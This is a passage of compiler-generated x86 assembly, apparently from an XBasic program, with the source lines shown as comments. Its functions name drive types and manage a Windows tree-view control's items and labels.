	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  setTreeDrives ()  *****
;  *****
;
; [1051] FUNCTION STRING driveTypeToName (dtype)
.code
;
#ifdef driveTypeToName.dtype
#undef driveTypeToName.dtype
#endif
#define driveTypeToName.dtype ebp+8	; exposes function argument 'dtype'
;
align 16
_driveTypeToName.client@4:
;  *****
;  *****  FUNCTION  driveTypeToName ()  *****
;  *****
func3E.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func3E.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
funcBody3E.client:
;
; [1052] STRING name
#ifdef driveTypeToName.name
#undef driveTypeToName.name
#endif
#define driveTypeToName.name ebp-40	; exposes local variable 'name'
;
;
; [1054] SELECT CASE dtype
	mov	eax,d[ebp+8]			;;; i665
; .select3E.005F = ebp-44	; internal variable
	mov	d[ebp-44],eax			;;; i670
;
; [1055] CASE $$DRIVE_REMOVABLE		:name = "Removable"
	mov	eax,2			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.005F.0001.client			;;; i71
	mov	eax,addr @_string.0294.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1056] CASE $$DRIVE_FIXED			:name = "Fixed"
	jmp	end.select.005F.client			;;; i69
case.005F.0001.client:
	mov	eax,3			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.005F.0002.client			;;; i71
	mov	eax,addr @_string.0296.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1057] CASE $$DRIVE_REMOTE			:name = "Remote"
	jmp	end.select.005F.client			;;; i69
case.005F.0002.client:
	mov	eax,4			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.005F.0003.client			;;; i71
	mov	eax,addr @_string.0298.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1058] CASE $$DRIVE_CDROM			:name = "CD-ROM"
	jmp	end.select.005F.client			;;; i69
case.005F.0003.client:
	mov	eax,5			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.005F.0004.client			;;; i71
	mov	eax,addr @_string.029A.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1059] CASE $$DRIVE_RAMDISK		:name = "Ram Disk"
	jmp	end.select.005F.client			;;; i69
case.005F.0004.client:
	mov	eax,6			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.005F.0005.client			;;; i71
	mov	eax,addr @_string.029C.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1060] CASE $$DRIVE_NO_ROOT_DIR	:name = "Not Root Dir"
	jmp	end.select.005F.client			;;; i69
case.005F.0005.client:
	mov	eax,1			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.005F.0006.client			;;; i71
	mov	eax,addr @_string.029E.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1061] CASE ELSE					:name = "Unknown"
	jmp	end.select.005F.client			;;; i69
case.005F.0006.client:
	mov	eax,addr @_string.029F.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1062] END SELECT
end.select.005F.client:
;
; [1064] RETURN name
	mov	eax,[ebp-40]			;;; i665
	call	%_clone.a0			;;; i870
	jmp	end.func3E.client			;;; i258
;
; [1065] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.driveTypeToName.client:  ;;; Function end label for Assembly Programmers.
end.func3E.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func3E.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func3E.client:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  driveTypeToName ()  *****
;  *****
;
; [1067] FUNCTION setTreeChild (hItem)
.code
;
#ifdef setTreeChild.hItem
#undef setTreeChild.hItem
#endif
#define setTreeChild.hItem ebp+8	; exposes function argument 'hItem'
;
align 16
_setTreeChild.client@4:
;  *****
;  *****  FUNCTION  setTreeChild ()  *****
;  *****
func56.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody56.client:
;
; [1068] SHARED TTREE dtree[]
data section 'globals$shared'
align	4
%%%dtree.client:	db 4 dup ?
.code
;
; [1071] IFZ hItem THEN RETURN 0
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0060.client			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func56.client			;;; i258
else.0060.client:
end.if.0060.client:
;
; [1072] upper = UBOUND(dtree[])
#ifdef setTreeChild.upper
#undef setTreeChild.upper
#endif
#define setTreeChild.upper ebp-40	; exposes local variable 'upper'
;
	mov	eax,d[%%%dtree.client]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.204			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.204:
	dec	eax			;;; i596
	mov	d[ebp-40],eax			;;; i670
;
; [1073] FOR i = upper TO 0 STEP -1
#ifdef setTreeChild.i
#undef setTreeChild.i
#endif
#define setTreeChild.i ebp-44	; exposes local variable 'i'
;
	mov	eax,d[ebp-40]			;;; i665
	mov	d[ebp-44],eax			;;; i670
	mov	eax,0			;;; i659
; .forlimit56.0061 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	mov	eax,1			;;; i659
	neg	eax			;;; i916
; .forstep56.0061 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
align 8
for.0061.client:
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	mov	esi,d[ebp-52]			;;; i665
	or	esi,esi
	jns	> A.205
	xchg	eax,ebx
A.205:
	cmp	eax,ebx			;;; i153
	jg	>> end.for.0061.client			;;; i154
;
; [1074] IF dtree[i].hItem == hItem THEN
	mov	eax,d[ebp-44]			;;; i665
	mov	edx,d[%%%dtree.client]			;;; i663a
	imul	eax,12			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax+4]			;;; i313b
	mov	ebx,d[ebp+8]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> else.0062.client			;;; i219
;
; [1075] dtree[i].child = 1
	mov	eax,d[ebp-44]			;;; i665
	mov	edx,d[%%%dtree.client]			;;; i663a
	imul	eax,12			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	ebx,1			;;; i659
	mov	d[eax+8],ebx			;;; i13b
;
; [1076] RETURN 1
	mov	eax,1			;;; i659
	jmp	end.func56.client			;;; i258
;
; [1077] END IF
else.0062.client:
end.if.0062.client:
;
; [1078] NEXT i
do.next.0061.client:
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-52]			;;; i665
	add	eax,ebx			;;; i238a
	mov	d[ebp-44],eax			;;; i670
	jmp	for.0061.client			;;; i238b
end.for.0061.client:
;
; [1080] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func56.client			;;; i258
;
; [1081] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.setTreeChild.client:  ;;; Function end label for Assembly Programmers.
end.func56.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  setTreeChild ()  *****
;  *****
;
; [1083] FUNCTION verifyTreeItem (hParent,STRING label)
.code
;
#ifdef verifyTreeItem.hParent
#undef verifyTreeItem.hParent
#endif
#define verifyTreeItem.hParent ebp+8	; exposes function argument 'hParent'
;
;
#ifdef verifyTreeItem.label
#undef verifyTreeItem.label
#endif
#define verifyTreeItem.label ebp+12	; exposes function argument 'label'
;
align 16
_verifyTreeItem.client@8:
;  *****
;  *****  FUNCTION  verifyTreeItem ()  *****
;  *****
func54.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody54.client:
;
; [1084] SHARED TTREE dtree[]
;
; [1087] IFZ hParent THEN RETURN 0
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0063.client			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func54.client			;;; i258
else.0063.client:
end.if.0063.client:
;
; [1088] IFZ label THEN RETURN
	mov	eax,[ebp+12]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.210			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0064.client			;;; i192
A.210:
	xor	eax,eax			;;; i862
	jmp	end.func54.client			;;; i258
else.0064.client:
end.if.0064.client:
;
; [1089] upper = UBOUND(dtree[])
#ifdef verifyTreeItem.upper
#undef verifyTreeItem.upper
#endif
#define verifyTreeItem.upper ebp-40	; exposes local variable 'upper'
;
	mov	eax,d[%%%dtree.client]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.211			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.211:
	dec	eax			;;; i596
	mov	d[ebp-40],eax			;;; i670
;
; [1090] FOR i = upper TO 0 STEP -1
#ifdef verifyTreeItem.i
#undef verifyTreeItem.i
#endif
#define verifyTreeItem.i ebp-44	; exposes local variable 'i'
;
	mov	eax,d[ebp-40]			;;; i665
	mov	d[ebp-44],eax			;;; i670
	mov	eax,0			;;; i659
; .forlimit54.0065 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	mov	eax,1			;;; i659
	neg	eax			;;; i916
; .forstep54.0065 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
align 8
for.0065.client:
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	mov	esi,d[ebp-52]			;;; i665
	or	esi,esi
	jns	> A.212
	xchg	eax,ebx
A.212:
	cmp	eax,ebx			;;; i153
	jg	>> end.for.0065.client			;;; i154
;
; [1091] IF dtree[i].hParent == hParent THEN
	mov	eax,d[ebp-44]			;;; i665
	mov	edx,d[%%%dtree.client]			;;; i663a
	imul	eax,12			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax]			;;; i313b
	mov	ebx,d[ebp+8]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> else.0066.client			;;; i219
;
; [1092] IF getTreeItemLabel (#tree_tab, dtree[i].hItem) == label THEN RETURN 1
	mov	eax,d[ebp-44]			;;; i665
	mov	edx,d[%%%dtree.client]			;;; i663a
	imul	eax,12			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax+4]			;;; i313b
	push	eax			;;; i667a
	push	[%#tree_tab.client]			;;; i672a
	call	func51.client			;;; i619
	mov	ebx,[ebp+12]			;;; i665
	call	%_string.compare.sv			;;; i690
	jne	>> else.0067.client			;;; i219
	mov	eax,1			;;; i659
	jmp	end.func54.client			;;; i258
else.0067.client:
end.if.0067.client:
;
; [1093] END IF
else.0066.client:
end.if.0066.client:
;
; [1094] NEXT i
do.next.0065.client:
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-52]			;;; i665
	add	eax,ebx			;;; i238a
	mov	d[ebp-44],eax			;;; i670
	jmp	for.0065.client			;;; i238b
end.for.0065.client:
;
; [1096] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func54.client			;;; i258
;
; [1097] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.verifyTreeItem.client:  ;;; Function end label for Assembly Programmers.
end.func54.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  verifyTreeItem ()  *****
;  *****
;
; [1099] FUNCTION getTreeParent (hItem)
.code
;
#ifdef getTreeParent.hItem
#undef getTreeParent.hItem
#endif
#define getTreeParent.hItem ebp+8	; exposes function argument 'hItem'
;
align 16
_getTreeParent.client@4:
;  *****
;  *****  FUNCTION  getTreeParent ()  *****
;  *****
func53.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody53.client:
;
; [1100] SHARED TTREE dtree[]
;
; [1102] IFZ hItem THEN RETURN 0
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0068.client			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func53.client			;;; i258
else.0068.client:
end.if.0068.client:
;
; [1103] upper = UBOUND(dtree[])
#ifdef getTreeParent.upper
#undef getTreeParent.upper
#endif
#define getTreeParent.upper ebp-40	; exposes local variable 'upper'
;
	mov	eax,d[%%%dtree.client]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.217			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.217:
	dec	eax			;;; i596
	mov	d[ebp-40],eax			;;; i670
;
; [1104] FOR i = upper TO 0 STEP -1
#ifdef getTreeParent.i
#undef getTreeParent.i
#endif
#define getTreeParent.i ebp-44	; exposes local variable 'i'
;
	mov	eax,d[ebp-40]			;;; i665
	mov	d[ebp-44],eax			;;; i670
	mov	eax,0			;;; i659
; .forlimit53.0069 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	mov	eax,1			;;; i659
	neg	eax			;;; i916
; .forstep53.0069 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
align 8
for.0069.client:
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	mov	esi,d[ebp-52]			;;; i665
	or	esi,esi
	jns	> A.218
	xchg	eax,ebx
A.218:
	cmp	eax,ebx			;;; i153
	jg	>> end.for.0069.client			;;; i154
;
; [1105] IF dtree[i].hItem == hItem THEN RETURN dtree[i].hParent
	mov	eax,d[ebp-44]			;;; i665
	mov	edx,d[%%%dtree.client]			;;; i663a
	imul	eax,12			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax+4]			;;; i313b
	mov	ebx,d[ebp+8]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> else.006A.client			;;; i219
	mov	eax,d[ebp-44]			;;; i665
	mov	edx,d[%%%dtree.client]			;;; i663a
	imul	eax,12			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax]			;;; i313b
	jmp	end.func53.client			;;; i258
else.006A.client:
end.if.006A.client:
;
; [1106] NEXT i
do.next.0069.client:
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-52]			;;; i665
	add	eax,ebx			;;; i238a
	mov	d[ebp-44],eax			;;; i670
	jmp	for.0069.client			;;; i238b
end.for.0069.client:
;
; [1108] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func53.client			;;; i258
;
; [1109] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.getTreeParent.client:  ;;; Function end label for Assembly Programmers.
end.func53.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  getTreeParent ()  *****
;  *****
;
; [1111] FUNCTION getTreeChild (hItem)
.code
;
#ifdef getTreeChild.hItem
#undef getTreeChild.hItem
#endif
#define getTreeChild.hItem ebp+8	; exposes function argument 'hItem'
;
align 16
_getTreeChild.client@4:
;  *****
;  *****  FUNCTION  getTreeChild ()  *****
;  *****
func55.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody55.client:
;
; [1112] SHARED TTREE dtree[]
;
; [1114] IFZ hItem THEN RETURN 0
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.006B.client			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func55.client			;;; i258
else.006B.client:
end.if.006B.client:
;
; [1115] upper = UBOUND(dtree[])
#ifdef getTreeChild.upper
#undef getTreeChild.upper
#endif
#define getTreeChild.upper ebp-40	; exposes local variable 'upper'
;
	mov	eax,d[%%%dtree.client]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.223			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.223:
	dec	eax			;;; i596
	mov	d[ebp-40],eax			;;; i670
;
; [1116] FOR i = upper TO 0 STEP -1
#ifdef getTreeChild.i
#undef getTreeChild.i
#endif
#define getTreeChild.i ebp-44	; exposes local variable 'i'
;
	mov	eax,d[ebp-40]			;;; i665
	mov	d[ebp-44],eax			;;; i670
	mov	eax,0			;;; i659
; .forlimit55.006C = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	mov	eax,1			;;; i659
	neg	eax			;;; i916
; .forstep55.006C = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
align 8
for.006C.client:
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	mov	esi,d[ebp-52]			;;; i665
	or	esi,esi
	jns	> A.224
	xchg	eax,ebx
A.224:
	cmp	eax,ebx			;;; i153
	jg	>> end.for.006C.client			;;; i154
;
; [1117] IF dtree[i].hItem == hItem THEN RETURN dtree[i].child
	mov	eax,d[ebp-44]			;;; i665
	mov	edx,d[%%%dtree.client]			;;; i663a
	imul	eax,12			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax+4]			;;; i313b
	mov	ebx,d[ebp+8]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> else.006D.client			;;; i219
	mov	eax,d[ebp-44]			;;; i665
	mov	edx,d[%%%dtree.client]			;;; i663a
	imul	eax,12			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax+8]			;;; i313b
	jmp	end.func55.client			;;; i258
else.006D.client:
end.if.006D.client:
;
; [1118] NEXT i
do.next.006C.client:
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-52]			;;; i665
	add	eax,ebx			;;; i238a
	mov	d[ebp-44],eax			;;; i670
	jmp	for.006C.client			;;; i238b
end.for.006C.client:
;
; [1120] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func55.client			;;; i258
;
; [1121] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.getTreeChild.client:  ;;; Function end label for Assembly Programmers.
end.func55.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  getTreeChild ()  *****
;  *****
;
; [1123] FUNCTION getTreeSelection (hItemCtrl)
.code
;
#ifdef getTreeSelection.hItemCtrl
#undef getTreeSelection.hItemCtrl
#endif
#define getTreeSelection.hItemCtrl ebp+8	; exposes function argument 'hItemCtrl'
;
align 16
_getTreeSelection.client@4:
;  *****
;  *****  FUNCTION  getTreeSelection ()  *****
;  *****
func50.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody50.client:
;
; [1125] RETURN SendMessageA (hItemCtrl, $$TVM_GETNEXTITEM, $$TVGN_CARET, 0)
;
; [0] EXTERNAL FUNCTION SendMessageA (hwnd, wMsg, wParam, lParam)
	push	0			;;; i656a
	push	9			;;; i656a
	push	4362			;;; i656a
	push	[ebp+8]			;;; i674a
	call	_SendMessageA@16			;;; i619
	jmp	end.func50.client			;;; i258
;
; [1126] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.getTreeSelection.client:  ;;; Function end label for Assembly Programmers.
end.func50.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  getTreeSelection ()  *****
;  *****
;
; [1128] FUNCTION STRING getTreeItemLabel (hwndCtl, hItem)
.code
;
#ifdef getTreeItemLabel.hwndCtl
#undef getTreeItemLabel.hwndCtl
#endif
#define getTreeItemLabel.hwndCtl ebp+8	; exposes function argument 'hwndCtl'
;
;
#ifdef getTreeItemLabel.hItem
#undef getTreeItemLabel.hItem
#endif
#define getTreeItemLabel.hItem ebp+12	; exposes function argument 'hItem'
;
align 16
_getTreeItemLabel.client@8:
;  *****
;  *****  FUNCTION  getTreeItemLabel ()  *****
;  *****
func51.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody51.client:
;
; [1129] STATIC TV_ITEM tvi
data section 'globals$shared'
align	4
%.composites.client:	db 4 dup ?
.code
data section 'globals$statics'
align	4
%51%tvi.client:	db 4 dup ?
.code
;
; [1130] STATIC STRING text
data section 'globals$statics'
align	4
%51%text.client:	db 4 dup ?
.code
;
; [1132] tvi.mask = $$TVIF_TEXT | $$TVIF_HANDLE
	mov	eax,1			;;; i659
	or	eax,16			;;; i763
	mov	ebx,d[%51%tvi.client]			;;; i663a
	mov	d[ebx],eax			;;; i13b
;
; [1133] tvi.hItem = hItem
	mov	eax,d[%51%tvi.client]			;;; i663a
	mov	ebx,d[ebp+12]			;;; i665
	mov	d[eax+4],ebx			;;; i13b
;
; [1134] tvi.cchTextMax = 256
	mov	eax,d[%51%tvi.client]			;;; i663a
	mov	ebx,256			;;; i659
	mov	d[eax+20],ebx			;;; i13b
;
; [1135] text = NULL$(tvi.cchTextMax)
	sub	esp,64			;;; i487
	mov	eax,d[%51%tvi.client]			;;; i663a
	mov	eax,d[eax+20]			;;; i313b
	mov	d[esp],eax			;;; i887
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	mov	ebx,addr %51%text.client			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1136] tvi.pszText = &text
	mov	eax,d[%51%text.client]			;;; i642
	mov	ebx,d[%51%tvi.client]			;;; i663a
	mov	d[ebx+16],eax			;;; i13b
;
; [1138] SendMessageA (hwndCtl, $$TVM_GETITEM, 0, &tvi)
	mov	eax,d[%51%tvi.client]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	4364			;;; i656a
	push	[ebp+8]			;;; i674a
	call	_SendMessageA@16			;;; i619
;
; [1139] RETURN CSIZE$(text)
	sub	esp,64			;;; i487
	mov	eax,[%51%text.client]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_csize.d.v			;;; i583
	add	esp,64			;;; i600
	jmp	end.func51.client			;;; i258
;
; [1140] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.getTreeItemLabel.client:  ;;; Function end label for Assembly Programmers.
end.func51.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  getTreeItemLabel ()  *****
;  *****
;
; [1142] FUNCTION STRING getTreeCompLabel (hItem)
.code
;
#ifdef getTreeCompLabel.hItem
#undef getTreeCompLabel.hItem
#endif
#define getTreeCompLabel.hItem ebp+8	; exposes function argument 'hItem'
;
align 16
_getTreeCompLabel.client@4:
;  *****
;  *****  FUNCTION  getTreeCompLabel ()  *****
;  *****
func52.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func52.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.238:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.238			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,180			;;; i114a
;
